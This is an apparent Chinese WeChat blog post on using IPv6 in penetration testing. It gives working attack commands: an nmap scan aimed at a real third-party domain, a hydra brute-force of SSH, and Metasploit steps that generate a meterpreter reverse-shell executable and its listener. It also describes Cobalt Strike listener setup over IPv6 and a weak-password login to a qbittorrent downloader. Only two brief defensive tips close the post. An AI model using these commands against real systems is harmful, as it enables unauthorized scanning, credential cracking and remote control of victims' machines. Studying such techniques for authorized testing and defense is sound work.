---
title: “肾透”中针对IPV6的攻击和防范
url: https://mp.weixin.qq.com/s/FgJ2fxSmFEHaS1Gpp2zcYQ
source: Doonsec's feed
date: 2026-01-05
fetch_date: 2026-01-06T03:29:32.122211
---

# “肾透”中针对IPV6的攻击和防范

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM0nOPKztMh93CNN78ictPbglsc5iafmCEib9FePkibNKKmMDib9XiaGBwEb81A/0?wx_fmt=jpeg)

# “肾透”中针对IPV6的攻击和防范

原创

大表哥吆

kali笔记

![]()

在小说阅读器中沉浸阅读

> 随着IPv6网络的普及。极大地方便了我们的工作。但同时也带来了相对隐藏的安全隐患。因此，本文从攻击者的角度演示IPv6在渗透测试中的利用，和如何防范相应的安全措施。

# 信息收集及利用

如何获取IPv6地址？相对IPv4、ipv6更长、更不容易记忆，且随时发生变化。因此很多人觉得自己很“安全”。

为了方便自己，我们常将ipv6地址解析到域名。而这也为安全埋下了隐患。

因此，我们可以通过ping域名的形式获取对方的IP地址。如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM0iaATlJV7SKGZkhFG3JlK8RxK38MLnU4cXqO1fUbichGicxPUZGMemDx1w/640?wx_fmt=png&from=appmsg)

利用ping可以获取ipv6地址

**端口扫描**

同样，我们可以利用nmap命令对目标进行端口扫描。

```
nmap -6 -T4 -A baidu.com
```

其中`-6` 指明该目标为ipv6目标。

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM0EUnpBEMeCh1jQAvIBFosKRLLmIWicf9wJiaicSBnDYojh7S6GDDOB3zkQ/640?wx_fmt=png&from=appmsg)

如上，我们扫描得到，系统类型为Debian。分别开启常见的`22``80``3306`等端口。有些大佬在本地环境中部署程序时，为了方便自己喜欢用弱口令，而这也对攻击者有了可乘之机！

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM0ibbWrrgtoRqzoBUZjQ8BqLeJ4TKRvCpmNNQE3SonFxbkxEDuBXQhylQ/640?wx_fmt=png&from=appmsg)

利用弱口令登录qbittorrent下载器

**对设备密码破解**

可以尝试对主机的`22``3306`端口进行暴力破解。示例如下：

```
hydra -L user.txt -P pass.txt -t 10 -o save.log -vV #ipv6地址# ssh
```

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM01XOLz1FUibd9PrsTXmTs4judMVFbNc7l1j3Ka5X6hCJyVZXoXAaM7Uw/640?wx_fmt=png&from=appmsg)

# IPV6上线Shell

我们在上线Payload时，常常苦于没有公网IP而无法实现跨网段上线设备。而IPV6为我们打开了新的思路。

**CS配置**

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM0ibz9TsOzdT7FbI3Ln2wsOwiah1doP5M1f6KiaBvMzxrfpkHYiavCeGCxVg/640?wx_fmt=png&from=appmsg)

新建监听IPV6地址

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM0HykTyFia4QETibDZE3iaokxzY9vwo5P68UJR3yHjsFHQIm49WGVxyqSDA/640?wx_fmt=png&from=appmsg)

生成payload

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM0hj5eBH8MexYpHrObEvfMUMte2c3MEIEa8fsIbvkFaFibCXGA19prqCg/640?wx_fmt=png&from=appmsg)

上线设备

**msf配置**

很简单，将原来的ipv4地址改成ipv6就行了。

```
msfconsole
use payload/windows/x64/meterpreter_reverse_http
set LHOST ipv6
set LPORT 4444
# 生成shell
generate -f exe -o shell.exe
```

配置监听

```
use exploits/multi/handler
set payload windows/x64/meterpreter_reverse_http
set LHOST ipv6
set LPORT 4444
exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathNJd8VK4UrYhmrVoO4ibYM0T3Yzp5EqAY5AzDRBotd2a4zDvHCSmWdeZOFzRX1Qe5dqiapP2X0Boog/640?wx_fmt=png&from=appmsg)

# 安全建议

* 非必要，请勿将敏感端口暴露在公网环境。
* 强化密码，定期更新漏洞。

**更多精彩文章 欢迎关注我们**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatia2JZVpfzEcXsOV52zrUXfJ951pRnM6UK5ghiaE4iaicHYADqWZFQmlZicF01GdKdwg9hRKlhiceeibQuRQ/0?wx_fmt=png)

kali笔记

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiatia2JZVpfzEcXsOV52zrUXfJ951pRnM6UK5ghiaE4iaicHYADqWZFQmlZicF01GdKdwg9hRKlhiceeibQuRQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过